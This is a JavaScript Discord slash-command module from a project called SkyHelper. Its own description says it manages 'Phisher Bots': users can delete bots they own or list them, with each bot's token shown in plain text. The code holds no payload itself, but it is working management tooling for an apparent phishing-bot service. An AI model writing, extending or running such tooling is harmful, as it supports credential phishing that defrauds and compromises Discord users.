import { SlashCommandBuilder, EmbedBuilder } from "discord.js";
import * as SHDB from "/root/SkyHelper/database.js";

export const data = new SlashCommandBuilder()
  .setName("bots")
  .setDescription("Manage Phisher Bots.")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("delete")
      .setDescription("Deletes a phisher bot.")
      .addStringOption((option) => option.setName("bot_id").setDescription("The bot ID to delete.").setRequired(true))
  )
  .addSubcommand((subcommand) => subcommand.setName("list").setDescription("Lists all bots."))
  .setDMPermission(false);

export async function execute(client, interaction) {
  const subcommand = interaction.options.getSubcommand();
  if (subcommand == "delete") {
    const botID = interaction.options.getString("bot_id");
    const botInfo = await SHDB.getBot(botID);
    if (!botInfo || botInfo?.owner != interaction.user.id) {
      return client.sendErrorEmbed(interaction, "This bot ID does not exist");
    }
    await SHDB.deleteBot(botID);
    await client.skyhelper.deleteBot(botID);

    const embed = new EmbedBuilder()
      .setColor("Red")
      .setTitle("🚫 Bot Deleted")
      .addFields({ name: "Bot ID", value: `\`\`\`${botID}\`\`\`` });

    await interaction.reply({ embeds: [embed], ephemeral: true });
  } else if (subcommand == "list") {
    const bots = await SHDB.getBotsByUserID(interaction.user.id);
    const embeds = [];
    var embed = new EmbedBuilder().setColor("Purple").setTitle("Bots");
    var i = 0;
    for (const { token, id } of bots) {
      i++;
      embed.addFields(
        { name: `${i}.`, value: `\u200b`, inline: true },
        { name: "Bot ID", value: `\`\`\`${id}\`\`\``, inline: true },
        { name: "Bot Token", value: `\`\`\`${token}\`\`\``, inline: true }
      );

      if (i % 5 == 0) {
        embeds.push(embed);
        embed = new EmbedBuilder().setColor("Purple").setTitle("Bots");
      }
    }
    if (i == 0 || i % 5 != 0) {
      embeds.push(embed);
    }

    await interaction.reply({ embeds: embeds, ephemeral: true });
  }
}
